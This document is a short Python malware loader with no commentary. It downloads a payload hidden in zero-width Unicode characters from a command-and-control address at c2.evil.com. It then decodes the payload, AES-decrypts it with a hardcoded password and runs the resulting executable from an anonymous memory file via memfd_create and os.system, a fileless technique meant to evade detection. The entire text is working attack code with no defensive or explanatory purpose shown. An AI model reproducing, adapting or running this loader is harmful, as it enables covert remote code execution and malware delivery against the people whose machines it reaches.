import ctypes, requests, os, hashlib
from Crypto.Cipher import AES

C2 = "http://c2.evil.com/payload_invisible.txt"
PASS = b"Vietnam"

def dec_inv(s):
    bits = ''.join('0' if c=='\u200B' else '1' if c=='\u200C' else '' for c in s)
    return bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8))

def dec_aes(data, key):
    iv, ct = data[:16], data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    pad_len = pt[-1]
    return pt[:-pad_len] if 1 <= pad_len <= 16 else pt

inv = requests.get(C2).text
enc = dec_inv(inv)
key = hashlib.sha256(PASS).digest()
exe = dec_aes(enc, key)

libc = ctypes.CDLL(None)
fd = libc.memfd_create(b"p", 0)
os.write(fd, exe)
os.system(f"/proc/self/fd/{fd} &")
